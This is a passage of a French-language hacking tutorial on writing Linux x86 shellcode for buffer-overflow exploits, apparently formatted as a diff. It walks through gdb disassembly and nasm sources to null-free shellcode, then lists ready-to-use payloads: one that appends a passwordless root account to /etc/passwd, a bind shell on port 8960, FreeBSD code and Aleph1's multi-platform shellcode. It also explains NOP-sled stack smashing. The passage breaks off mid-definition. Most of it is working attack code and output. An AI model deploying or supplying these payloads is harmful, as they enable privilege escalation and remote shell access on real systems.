+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb)  disassemble main
+Dump of assembler code for function main:
+0x8048170 <main>:       pushl  %ebp /* met %ebp sur la pile */
+0x8048171 <main+1>:     movl   %esp,%ebp /*copie esp dans ebp */
+0x8048173 <main+3>:     subl   $0x8,%esp /* enleve 0x8 a esp */
+0x8048176 <main+6>:     movl   $0x8059ecc,0xfffffff8(%ebp) /* copie l'adresse
+du shell dans ebp*/
+0x804817d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+0x8048184 <main+20>:    pushl  $0x0 /* met 0x0 sur la pile */
+0x8048186 <main+22>:    leal   0xfffffff8(%ebp),%eax
+0x8048189 <main+25>:    pushl  %eax /* met eax sur la pile */
+0x804818a <main+26>:    movl   0xfffffff8(%ebp),%eax
+0x804818d <main+29>:    pushl  %eax /* met eax sur la pile */
+0x804818e <main+30>:    call   0x804d510 <execve> /* renvoie sur execve */
+0x8048193 <main+35>:    addl   $0xc,%esp /* ajoute 0xc dasn esp */
+0x8048196 <main+38>:    movl   %ebp,%esp /* copie ebp dans esp */
+0x8048198 <main+40>:    popl   %ebp /* prend ebp dasn la pile */
+0x8048199 <main+41>:    ret
+0x804819a <main+42>:    nop
+0x804819b <main+43>:    nop
+End of assembler dump. 
+(gdb) disassemble execve     
+      Dump of assembler code for function execve:
+0x804d510 <execve>:     pushl  %ebx /* met ebx sur la pile */
+0x804d511 <execve+1>:   movl   0x10(%esp,1),%edx
+0x804d515 <execve+5>:   movl   0xc(%esp,1),%ecx
+0x804d519 <execve+9>:   movl   0x8(%esp,1),%ebx
+0x804d51d <execve+13>:  movl   $0xb,%eax /* copie 0xb dans eax */
+0x804d522 <execve+18>:  int    $0x80 /* initialise */
+0x804d524 <execve+20>:  popl   %ebx /* prend l'adresse ebx dans la pile */
+0x804d525 <execve+21>:  cmpl   $0xfffff001,%eax 
+0x804d52a <execve+26>:  jae    0x804d730 <__syscall_error> /* envoie sur 
+__syscall_error si 0xfffff001>=%eax */ 
+0x804d530 <execve+32>:  ret
+0x804d531 <execve+33>:  nop
+0x804d532 <execve+34>:  nop
+0x804d533 <execve+35>:  nop
+0x804d534 <execve+36>:  nop
+0x804d535 <execve+37>:  nop
+0x804d536 <execve+38>:  nop
+0x804d537 <execve+39>:  nop
+0x804d538 <execve+40>:  nop
+0x804d539 <execve+41>:  nop
+0x804d53a <execve+42>:  nop
+0x804d53b <execve+43>:  nop
+0x804d53c <execve+44>:  nop  
+0x804d53d <execve+45>:  nop
+0x804d53e <execve+46>:  nop
+0x804d53f <execve+47>:  nop
+End of assembler dump.    
+(gdb) disassemble __syscall_error
+Dump of assembler code for function __syscall_error:
+0x804d730 <__syscall_error>:    negl   %eax
+End of assembler dump.
+(gdb)               
+Bon maintenant on va faire un fichier *.S.
+
+
+/* shell.s */
+ .global _start
+_start:
+jmp call /* envoie sur call */
+main:
+/* main */
+popl   %esi /* prend l'adresse de /bin/sh */
+subl   $0x8,%esp /* code gdb */
+movl   %esi,0xfffffff8(%ebp) /* copie l'adresse /bin/sh dans %ebp */
+movl   $0x0,0xfffffffc(%ebp)
+pushl  $0x0
+leal   0xfffffff8(%ebp),%eax
+pushl  %eax
+movl   0xfffffff8(%ebp),%eax
+pushl  %eax
+call exec /* envoie sur exec */
+addl   $0xc,%esp
+movl   %ebp,%esp
+popl   %ebp
+
+exec:
+pushl  %ebx
+movl   0x10(%esp,1),%edx    
+ movl   0xc(%esp,1),%ecx
+movl   0x8(%esp,1),%ebx
+movl   $0xb,%eax
+int    $0x80
+popl   %ebx
+cmpl   $0xfffff001,%eax 
+jae    exit /* envoie sur exit si 0xfffff001>=%eax */
+
+exit:
+negl   %eax
+
+call:
+call main /* envoie sur main */
+.string "/bin/sh"     
+/* fin shell.S */
+
+Apres ca on enleve le code inutil:
+
+/* shell2.S */
+ .global _start
+/* envoie sur call */
+_start:
+jmp call
+main:
+/* main */
+popl   %esi
+subl   $0x8,%esp
+movl   %esi,0xfffffff8(%ebp)
+xorl   %eax,%eax /* OU exclusif pour que eax sois remit a 0*/
+movl   %eax,0xfffffffc(%ebp)
+leal   0xfffffff8(%ebp),%eax
+pushl  %eax
+movl   0xfffffff8(%ebp),%eax
+pushl  %eax
+call exec
+addl   $0xc,%esp
+movl   %ebp,%esp
+popl   %ebp
+/* execve */
+exec:
+pushl  %ebx         
+movl   0x10(%esp,1),%edx
+movl   0xc(%esp,1),%ecx
+movl   0x8(%esp,1),%ebx
+movl   $0xb,%eax
+int    $0x80
+popl   %ebx
+/* envoie vers main */
+call:
+call main
+.string "/bin/sh"   
+/* fin shell2.S */ 
+Maintenent fait:
+as -a -o shell2.o shell2.S > shell2.asm ; ld -o shell2 shell2.o
+[Lionel@OrganiKs]$ ./shell2
+bash$ exit
+exit
+Bienssur ce code ne vas pas du tous mais cela vas vous aider a mieux
+comprendre comment ca se passe ...
+
+2-1)Shellcode via connaissance in asm
+-------------------------------------
+Bon la faut connaitre un peu l'asm , c'est obligé!!
+Si vous avez lut le chapitre d'avant ca pourra vous aidez à mieux configurer
+les parametres et mieux comprendre.
+Il vous faudrez "nasm" un compilateur d'asm pour linux!!Grace a lui tu peus
+compiler des trucs en asm pour presque n'importe quelle platforme, c'est super
+bien! a)expliquation:
+---------------
+Voila ce que l'on veut faire:
+---shell.c---
+void main() { 
+      char *argc; 
+      argc="/bin/sh"; 
+      execve(argc,&argc, 0); 
+---EOF---
+
+Ca doit donner ca en asm:
+
+----schema----
+int(EBX, ECX, EDX);
+----EOF----
+
+                         EBX               ECX                EDX 
+    int execve(const char *file, char **const argv, char **const envp); 
+ 
+EAX,EBX,ECX,EDX sont des registres 32 bits en asm!
+INT va appeler une interruption.En gros c'est egale a execve.
+EBX va contenir "/bin/sh",0.
+ECX va contenir "sh"
+EDX va contenir "0" (NULL).
+EAX va contenir 11 (11 est une fonction de int80, je l'ai trouver grace au
+chapitre plus haut) 
+Voici la liste de toute les fonctions pour int 80:
+--<asm/unistd.h>--
+#define __NR_setup		  0	/* used only by init, to get system
+going */ 
+#define __NR_exit		  1
+#define __NR_fork		  2
+#define __NR_read		  3
+#define __NR_write		  4
+#define __NR_open		  5
+#define __NR_close		  6
+#define __NR_waitpid		  7
+#define __NR_creat		  8
+#define __NR_link		  9
+#define __NR_unlink		 10
+#define __NR_execve		 11
+#define __NR_chdir		 12
+#define __NR_time		 13
+#define __NR_mknod		 14
+#define __NR_chmod		 15
+#define __NR_chown		 16
+#define __NR_break		 17
+#define __NR_oldstat		 18
+#define __NR_lseek		 19
+#define __NR_getpid		 20
+#define __NR_mount		 21
+#define __NR_umount		 22
+#define __NR_setuid		 23
+#define __NR_getuid		 24
+#define __NR_stime		 25
+#define __NR_ptrace		 26
+#define __NR_alarm		 27
+#define __NR_oldfstat		 28
+#define __NR_pause		 29
+#define __NR_utime		 30
+#define __NR_stty		 31
+#define __NR_gtty		 32
+#define __NR_access		 33
+#define __NR_nice		 34
+#define __NR_ftime		 35
+#define __NR_sync		 36
+#define __NR_kill		 37
+#define __NR_rename		 38
+#define __NR_mkdir		 39
+#define __NR_rmdir		 40
+#define __NR_dup		 41
+#define __NR_pipe		 42
+#define __NR_times		 43
+#define __NR_prof		 44
+#define __NR_brk		 45
+#define __NR_setgid		 46
+#define __NR_getgid		 47
+#define __NR_signal		 48
+#define __NR_geteuid		 49
+#define __NR_getegid		 50
+#define __NR_acct		 51
+#define __NR_phys		 52
+#define __NR_lock		 53
+#define __NR_ioctl		 54
+#define __NR_fcntl		 55
+#define __NR_mpx		 56
+#define __NR_setpgid		 57
+#define __NR_ulimit		 58
+#define __NR_oldolduname	 59
+#define __NR_umask		 60
+#define __NR_chroot		 61
+#define __NR_ustat		 62
+#define __NR_dup2		 63
+#define __NR_getppid		 64
+#define __NR_getpgrp		 65
+#define __NR_setsid		 66
+#define __NR_sigaction		 67
+#define __NR_sgetmask		 68
+#define __NR_ssetmask		 69
+#define __NR_setreuid		 70
+#define __NR_setregid		 71
+#define __NR_sigsuspend		 72
+#define __NR_sigpending		 73
+#define __NR_sethostname	 74
+#define __NR_setrlimit		 75
+#define __NR_getrlimit		 76
+#define __NR_getrusage		 77
+#define __NR_gettimeofday	 78
+#define __NR_settimeofday	 79
+#define __NR_getgroups		 80
+#define __NR_setgroups		 81
+#define __NR_select		 82
+#define __NR_symlink		 83
+#define __NR_oldlstat		 84
+#define __NR_readlink		 85
+#define __NR_uselib		 86
+#define __NR_swapon		 87
+#define __NR_reboot		 88
+#define __NR_readdir		 89
+#define __NR_mmap		 90
+#define __NR_munmap		 91
+#define __NR_truncate		 92
+#define __NR_ftruncate		 93
+#define __NR_fchmod		 94
+#define __NR_fchown		 95
+#define __NR_getpriority	 96
+#define __NR_setpriority	 97
+#define __NR_profil		 98
+#define __NR_statfs		 99
+#define __NR_fstatfs		100
+#define __NR_ioperm		101
+#define __NR_socketcall		102
+#define __NR_syslog		103
+#define __NR_setitimer		104
+#define __NR_getitimer		105
+#define __NR_stat		106
+#define __NR_lstat		107
+#define __NR_fstat		108
+#define __NR_olduname		109
+#define __NR_iopl		110
+#define __NR_vhangup		111
+#define __NR_idle		112
+#define __NR_vm86		113
+#define __NR_wait4		114
+#define __NR_swapoff		115
+#define __NR_sysinfo		116
+#define __NR_ipc		117
+#define __NR_fsync		118
+#define __NR_sigreturn		119
+#define __NR_clone		120
+#define __NR_setdomainname	121
+#define __NR_uname		122
+#define __NR_modify_ldt		123
+#define __NR_adjtimex		124
+#define __NR_mprotect		125
+#define __NR_sigprocmask	126
+#define __NR_create_module	127
+#define __NR_init_module	128
+#define __NR_delete_module	129
+#define __NR_get_kernel_syms	130
+#define __NR_quotactl		131
+#define __NR_getpgid		132
+#define __NR_fchdir		133
+#define __NR_bdflush		134
+#define __NR_sysfs		135
+#define __NR_personality	136
+#define __NR_afs_syscall	137 /* Syscall for Andrew File System */
+#define __NR_setfsuid		138
+#define __NR_setfsgid		139
+#define __NR__llseek		140
+#define __NR_getdents		141
+#define __NR__newselect		142
+#define __NR_flock		143
+#define __NR_msync		144
+#define __NR_readv		145
+#define __NR_writev		146
+#define __NR_getsid		147
+#define __NR_fdatasync		148
+#define __NR__sysctl		149
+#define __NR_mlock		150
+#define __NR_munlock		151
+#define __NR_mlockall		152
+#define __NR_munlockall		153
+#define __NR_sched_setparam		154
+#define __NR_sched_getparam		155
+#define __NR_sched_setscheduler		156
+#define __NR_sched_getscheduler		157
+#define __NR_sched_yield		158
+#define __NR_sched_get_priority_max	159
+#define __NR_sched_get_priority_min	160
+#define __NR_sched_rr_get_interval	161
+#define __NR_nanosleep		162
+#define __NR_mremap		163
+---EOF---
+C'est pas beau la vie? :)
+
+b)1er exemple
+-------------
+---Shell.S---
+    global main 
+    main: 
+    section .text 
+    mov	  eax, 11		; copie la fonction 11 dans EAX
+    mov	  ebx, file		; copie file dans EBX
+    mov	  [argv], ebx	        ; copie EBX dans PEKARE1
+    mov	  ecx, argv		; copie pekare1 dans ECX
+    mov	  edx, envp		; copie pekare2 dans EDX
+    int	  80h			; c'est la commande execve
+ 
+    section .data 
+      file      db      "/bin/sh",0 
+      argv 	dd	0 
+      envp	dd	0
+---EOF---
+Voila ce que ça donne en asm, mais c'est pas fini!
+
+c)insertion de "jmp", "pop" et "call"
+-------------------------------------
+Exemple:
+
+----Shell2.S----
+    global main 
+    main:                       ;debut
+    section .text 
+    jmp       calladr           ; saute sur l'adresse call
+   start: 
+    pop	ebx			; pop prend file qui est 
+                                ; sur la pile
+    mov     eax, 11             ; fonction 11 de int80
+    ;mov    ebx, file           ; copie file dans EBX 
+    ;mov    [argv], ebx         ; copie EBX dans argv
+    mov	    [ebx+8], ebx	; copie EBX dans EBX+8
+ 
+    ;mov    ecx, argv           ; copie argv dans ECX 
+    lea	    ecx, [ebx+8]	; EBX+8 dans ECX
+ 
+    ;mov    edx, envp           ; copie envp dans EDX 
+    lea	    edx, [ebx+11]	; EBX+11= envp copie envp dans EDX 
+ 
+    int     80h                 ; execve , initialise... 
+    calladr:                    ; adresse call
+    call	start           ; saute sur l'adresse start
+ 
+    file         db      "/bin/sh",0 ;la variable est d'un type byte on utilise db 
+                                     ; copie dans file l'adresse de/bin/sh
+    argv         dd      0           ;la variable est d'un type entier on utilise dd 
+                                     ; copie dans argv 0
+    envp         dd      0           ; idem que argv
+----EOF----
+
+Pour mieux comprendre se que je fais, faut deja lire de la doc sur l'asm, bon
+et pour ce qui comprenderais pas tous je vais vous expliquer comment je fais:
+En faite il faut s'imaginer ca:
+         EBX      ECX  EDX
+REG----|-------|-|--|-|-|------------------------------------------
+       0       7 8  10
+        /bin/sh   sh   0
+Bon je sais ca saute pas au yeux du premier coup mais reflechisser un peu ,
+regarder le code et ca , vous devriez comprendre!
+Bon maintenent faut compiler avec "nasm" :)
+syntaxe:
+[Lionel@OrganiKs]$ nasm -f aout -o shell2 shell2.S
+[Lionel@OrganiKs]$ chmod +x shell2
+[Lionel@OrganiKs]$ ./shell2
+bash$ exit
+exit                               
+Deja ca marche :o)
+Bon maintenent gdb ...
+[Lionel@OrganiKs]$ gdb shell2
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) x/bx main   
+0x0 <main>:     0xe9
+(gdb)
+0x1 <main+1>:   0x11
+(gdb)
+0x2 <main+2>:   0x00
+(gdb)
+0x3 <main+3>:   0x00
+(gdb) ....
+en C:
+char shellcode[] = 
+       "\xe9\x11\x00\x00\....
+
+d)On suprime argv et envp
+-------------------------
+
+Ici j'explique comment enlever argv et envp...
+
+-------Shell3.S------
+[global main]
+main:             
+jmp     calladress
+start:
+pop     ebx         
+mov     [ebx+8], ebx
+xor     esi, esi       ; ceci est une port ou exclusif qui rend esi null
+                       ; esi est un registre
+mov     [ebx+12], esi  ; on copie esi(0) a l'emplacement ebx+12
+mov     eax, 11        
+lea     ecx, [ebx+8]  
+lea     edx, [ebx+12]  ; on copie ebx+12(0) dans edx
+int     80h
+calladress:
+call    start
+file   db   "/bin/sh",0   
+-----EOF-----
+syntaxe:
+[Lionel@OrganiKs]$ nasm -f aout -o shell3 shell3.S
+[Lionel@OrganiKs]$ chmod +x shell3
+[Lionel@OrganiKs]$ ./shell3
+bash$ exit
+exit  
+[Lionel@OrganiKs]$ gdb shell3
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) x/bx main
+0x0 <main>:     0xe9
+(gdb)
+0x1 <main+1>:   0x16
+(gdb)
+0x2 <main+2>:   0x00
+(gdb)
+0x3 <main+3>:   0x00
+(gdb) ...
+char shellcode[]=
+   "\xe9\x16\x00\...
+
+Voila ce que ca donne a la fin: 
+ 
+----Shell.c----
+char shellcode[]=
+   "\xe9\x16\x00\x00\x00\x5b\x89\x5b\x08\x31\xf6\x89\x73\x0c\xb8\x0b"
+   "\x00\x00\x00\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff"
+   "/bin/sh\0";
+void main()
+{
+
+  int *ret;
+  printf("OrganiKs Crew\n");
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+}
+----EOF----
+[Lionel@OrganiKs]$ cc -o shell shell.c
+[Lionel@OrganiKs]$ ./shell
+OrganiKs Crew
+bash$ exit
+exit     
+
+e)Supression des bytes Null
+---------------------------
+
+Pour que notre shellcode marche dans un exploit nous devons enlever tous les
+bytes null ("x00").                      
+Notre nouveau code donne ça:
+-------Shell4.S------
+    global main 
+    main: 
+    jmp     short calladress  ; short c'est pour eviter les bytes null
+    hit: 
+    pop     ebx			 
+    mov     [ebx+8], ebx	 
+    xor     eax, eax	       ; on met eax car al le remplace apres
+    mov     [ebx+7], al        ; ce ci met un 0 apres /bin/sh 
+    mov     [ebx+12], eax
+    mov     al, 11 	       ; on change eax par al un registre 
+                               ; equivalent qui ne fera pas de bytes null   
+    lea     ecx, [ebx+8]	     
+    lea     edx, [ebx+12]	
+    int     80h			; execute /bin/sh 
+    calladress: 
+    call    hit 
+    porgg   db      "/bin/sh" 
+-----EOF-----
+[Lionel@OrganiKs]$ nasm -f aout -o shell4 shell4.S
+[Lionel@OrganiKs]$ ./shell4
+bash$ exit
+exit        
+[Lionel@OrganiKs]$ gdb shell4
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) x/bx main
+0x0 <main>:     0xeb
+(gdb) ...
+----Sell2.c-----
+char shellcode[]=
+ "\xeb\x16\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b"    
+ "\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh";
+void main()
+{
+
+  int *ret;
+  printf("OrganiKs Crew\n");
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+}
+----EOF----
+[Lionel@OrganiKs]$ cc -o shell2 shell.c
+[Lionel@OrganiKs]$ ./shell2
+OrganiKs Crew
+bash$ exit
+exit   
+Voila vous avez fait un shellcode!!!!!
+
+f)Conclusion
+------------
+Ca reste t'ou de meme assez complexe, je ne serais que vous conseillez de lire
+de la bonne doc sur l'asm, et je vous souhaites bonne chance!
+
+3) Bonus!
+---------
+
+Vue que tu es surement comme moi pas tres bon en asm, voila des good shellcode
+en format Source asm et en C: 
+ /* 
+ * Source to this is pass.s
+ * This will append a root line to the passwd file (see the source).
+ *
+ * Shok (Matt Conover), shok@dataforce.net
+ */
+
+char shellcode[]=
+  "\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x35\x01\xfb"
+  "\x30\xc0\x88\x43\x0b\x31\xc9\x66\xb9\x41\x04\x31\xd2\x66\xba\xa4"
+  "\x01\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc9\xb1\x41\x01\xf9\x31"
+  "\xd2\xb2\x1f\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x2f"
+  "\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x01\x77\x30\x30\x77\x30"
+  "\x30\x3a\x3a\x30\x3a\x30\x3a\x77\x30\x77\x30\x77\x21\x3a\x2f\x3a"
+  "\x2f\x62\x69\x6e\x2f\x73\x68\x0a";
+
+void main()
+{
+
+  int *ret;
+  
+  printf("w00w00!\n");
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+}
+
+
+-----imap.S-------
+.globl main
+main:
+jmp call
+start:
+
+popl %ebx /* get address of /bin/sh */
+movl %ebx,%ecx  /* copy the address to ecx */
+addb $0x6,%cl /* ecx now points to the last character */
+
+loop:
+cmpl %ebx,%ecx
+jl skip     /* if (ecx<ebx) goto skip */
+addb $0x20,(%ecx) /* adds 0x20 to the byte pointed to by %ecx */
+decb %cl   /* move the pointer down by one */
+jmp loop   
+skip:
+
+/* generic shell-spawning code */
+movl %ebx,0x8(%ebx)
+xorl %eax,%eax
+movb %eax,0x7(%ebx)
+movl %eax,0xc(%ebx)
+movb $0xb,%al
+leal 0x8(%ebx),%ecx
+leal 0xc(%ebx),%edx
+int $0x80
+xorl %eax,%eax
+inc %al
+int $0x80
+call:
+call start
+.string "\x0f\x42\x49\x4e\x0f\x53\x48"
+--------------
+----Imap shellcode-----
+char shellcode[]=
+  "\xEB\x2C\x5B\x89\xD9\x80\xC1\x06\x39\xD9\x7C\x07\x80\x01\x20\xFE\xC9\xEB"
+  "\xF5\x89\x5B\x08\x31\xC0\x88\x43\x07\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D"
+  "\x53\x0C\xCD\x80\x31\xC0\xFE\xC0\xCD\x80\xE8\xCF\xFF\xFF\xFF\x0f\x42\x49"
+  "\x4e\x0f\x53\x48";
+void main()
+{
+
+  int *ret;
+  printf("OrganiKs Crew\n");
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+}
+---EOF---
+
+----portshell.S----
+.globl main
+main:
+
+/* I had to put in a "bounce" in the middle of the code as the shellcode
+ * was too big. If I had made it jmp the entire shellcode, the instruction
+ * would have contained a null byte, so if anyone has a shorter version,
+ * please send me it.
+ */
+
+jmp bounce
+start:
+popl %esi
+
+/* socket(2,1,0) */
+xorl %eax,%eax
+movl %eax,0x8(%esi)  /* 3rd arg == 0 */
+movl %eax,0xc(%esi)  /* zero out sock.sin_family&sock.sin_port */
+movl %eax,0x10(%esi) /* zero out sock.sin_addr */
+incb %al
+movl %eax,%ebx       /* socket() subcode == 1 */
+movl %eax,0x4(%esi)  /* 2nd arg == 1 */
+incb %al
+movl %eax,(%esi)     /* 1st arg == 2 */
+movw %eax,0xc(%esi)  /* sock.sin_family == 2 */
+leal (%esi),%ecx     /* load the address of the arguments into %ecx */
+movb $0x66,%al       /* set socket syscall number */
+int $0x80
+
+/* bind(fd,&sock,0x10) */
+incb %bl             /* bind() subcode == 2 */
+movb %al,(%esi)      /* 1st arg == fd (result from socket()) */
+movl %ecx,0x4(%esi)  /* copy address of arguments into 2nd arg */
+addb $0xc,0x4(%esi)  /* increase it by 12 bytes to point to sockaddr struct */
+movb $0x10,0x8(%esi) /* 3rd arg == 0x10 */
+movb $0x23,0xe(%esi) /* set sin.port */
+movb $0x66,%al       /* no need to set %ecx, it is already set */
+int $0x80 
+
+/* listen(fd,2) */
+movl %ebx,0x4(%esi) /* bind() subcode==2, move this to the 2nd arg */
+incb %bl            /* no need to set 1st arg, it is the same as bind() */
+incb %bl            /* listen() subcode == 4 */
+movb $0x66,%al      /* again, %ecx is already set */
+int $0x80
+
+/* fd2=accept(fd,&sock,&fromlen) */
+incb %bl            /* accept() subcode == 5 */
+movl %ecx,0x4(%esi) /* copy address of arguments into 2nd arg */
+addb $0xc,0x4(%esi) /* increase it by 12 bytes */
+movl %ecx,0x4(%esi) /* copy address of arguments into 3rd arg */
+addb $0x1c,0x4(%esi) /* increase it by 12+16 bytes */
+movb $0x66,%al
+int $0x80
+
+/* KLUDGE */
+jmp skippy
+bounce:
+jmp call
+skippy:
+
+/* dup2(fd2,0) dup2(fd2,1) dup2(fd2,2) */
+movb %al,%bl /* move fd2 to 1st arg */
+xorl %ecx,%ecx /* 2nd arg is 0 */
+movb $0x3f,%al /* set dup2() syscall number */
+int $0x80
+incb %cl       /* 2nd arg is 1 */
+movb $0x3f,%al
+int $0x80
+incb %cl       /* 2nd arg is 2 */
+movb $0x3f,%al
+int $0x80
+
+/* execve("/bin/sh",["/bin/sh"],NULL) */
+movl %esi,%ebx
+addb $0x20,%ebx /* %ebx now points to "/bin/sh" */
+xorl %eax,%eax
+movl %ebx,0x8(%ebx)
+movb %al,0x7(%ebx)
+movl %eax,0xc(%ebx)
+movb $0xb,%al
+leal 0x8(%ebx),%ecx
+leal 0xc(%ebx),%edx
+int $0x80
+/* exit(0) */
+xorl %eax,%eax
+movl %eax,%ebx 
+incb %al
+int $0x80
+call:
+call start
+.ascii "abcdabcdabcd""abcdefghabcdefgh""abcd""/bin/sh"
+-----------------------------------------------------
+
+-----PORT SHELL (bind a shell on port 8960)------
+char shellcode[]=
+  "\xEB\x59\x5E\x31\xC0\x89\x46\x08\x89\x46\x0C\x89\x46\x10\xFE\xC0"
+  "\x89\xC3\x89\x46\x04\xFE\xC0\x89\x06\x66\x89\x46\x0C\x8D\x0E\xB0"
+  "\x66\xCD\x80\xFE\xC3\x88\x06\x89\x4E\x04\x80\x46\x04\x0C\xC6\x46"
+  "\x08\x10\xC6\x46\x0E\x23\xB0\x66\xCD\x80\x89\x5E\x04\xFE\xC3\xFE"
+  "\xC3\xB0\x66\xCD\x80\xFE\xC3\x89\x4E\x04\x80\x46\x04\x0C\x89\x4E"
+  "\x04\x80\x46\x04\x1C\xB0\x66\xCD\x80\xEB\x02\xEB\x36\x88\xC3\x31"
+  "\xC9\xB0\x3F\xCD\x80\xFE\xC1\xB0\x3F\xCD\x80\xFE\xC1\xB0\x3F\xCD"
+  "\x80\x89\xF3\x80\xC3\x20\x31\xC0\x89\x5B\x08\x88\x43\x07\x89\x43"
+  "\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\x31\xC0\x89\xC3\xFE"
+  "\xC0\xCD\x80\xE8\x6A\xFF\xFF\xFF\abcdabcdabcdabcdefghabcdefghabcd"
+  "/bin/sh";  
+void main()
+{
+
+  int *ret;
+  printf("OrganiKs Crew: bind on port 8960\n");
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+}
+---EOF---
+
+----------------FreeBSD shellcode-----------
+
+----fbsd.S----
+.globl main
+main:
+jmp call
+start:
+/* Modify the ascii string so it becomes lcall 7,0 */
+popl %esi
+xorl %ebx,%ebx
+movl %ebx,0x1(%esi) /* zeroed long word */
+movb %bl,0x6(%esi)  /* zeroed byte */
+movl %esi,%ebx
+addb $0x8,%bl /* ebx points to binsh */
+jmp blah /* start the code */
+
+call:
+call start
+syscall:
+.ascii "\x9a\x01\x01\x01\x01\x07\x01" /* hidden lcall 7,0 */
+ret
+binsh:
+.ascii "/bin/sh...."
+blah:
+/* put shellcode here */
+call syscall 
+-----EOF----
+Thx to b4b0, w00w00, !ADM...And swedish ;)
+
+
+VI)-Le but de l'exploit(voir l'article de "ankou" thx)
+-----------------------------------------------------------
+
+Notre but est de remplacer la valeur de ret ( l'adresse de retour d'origine )
+par celle qui fait executer notre shellcode. 
+1-)
+                     Buffer        sfp   ret  
+<------     [                    ][    ][    ]
+bottom of    DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF    top of
+memory       89ABCDEF0123456789AB  CDEF  0123    memory
+
+<------     [NNNNNNNNNNJJSSSSCCss][ssss][0xD8]
+             ^         | ^   ^|            |
+             |_________|_|___||____________| (1)
+         (2)           |_|___||
+                         |____| (3)
+top of                                                            bottom of
+stack                                                                 stack
+
+2-)
+   ----------------------------------
+   |     buffer      | ebp | ret    |
+   ----------------------------------
+   | NOP  | shellcode | addr.shell  |
+   ----------------------------------
+
+
+Le schema 1:
+ - buffer represente l'espace en memoire d' une variables d'un programme.
+ - ret est l'adresse de retour de la fonction.
+ - N = NOP (0x90)
+ - J = JMP (0xeb) qui correspond un saut (jump) relatif vers une autre adresse.
+ - S = Shell qui execute un shell /bin/sh
+ - C = CALL qui dit d'executer le code a l'adresse specifier.
+ - s = string qui represente des caracteres sans interets.
+
+Le but pour faire deborder un buffer est de mettre le buffer dans la zone
+buffer+sfp+ret (voir plus si besoin), et de remplacer l'adresse 'ret'
+par une adresse qui pointe dans la zone NOP.
+Ca impliquera dans l'ordre :
+ (1) 'ret' pointe en 0xD8 qui est dans la zone NOP.
+     Notre pointeur se deplace vers la droite ( car NOP = rien ) jusqu'au JMP.
+ (2) Le JMP est relatif et pointe CALL. Notre pointeur se place sur CALL et lit l'adresse a executer.
+     Cette adresse pointe le debut du Shell.
+ (3) Notre pointeur se place au debut du Shell et l'execute.
+Le schema 2 est a peut pres pareille que le 1.
+
+VII)-Trouver le buffer exploitable dans un code
+-----------------------------------------------
+
+Les fonctions qui sont vulnerables sont gets(), sprintf(), strcpy(), strcat(), ainsi que des fonctions jugees "plus secures" 
+telles que snprintf() ou bopcy(), si celles-ci sont mal utilisees.  De plus, 
+toute fonction de libc (ou toute autre librairie) faisant appel a de telles 
+fonctions sont, elles-aussi, contaminés par la vulnerabilite, par exemple 
+certaines vieilles versions de syslog(). 
+
+VIII)- PETIT PLUS(shellcode de aleph1)
+--------------------------------------
+shellcode.h
+------------------------------------------------------------------------------
+#if defined(__i386__) && defined(__linux__)
+
+#define NOP_SIZE	1
+char nop[] = "\x90";
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
+
+#define NOP_SIZE	4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
+  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
+#elif defined(__sparc__) && defined(__sun__)
+
+#define NOP_SIZE        4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
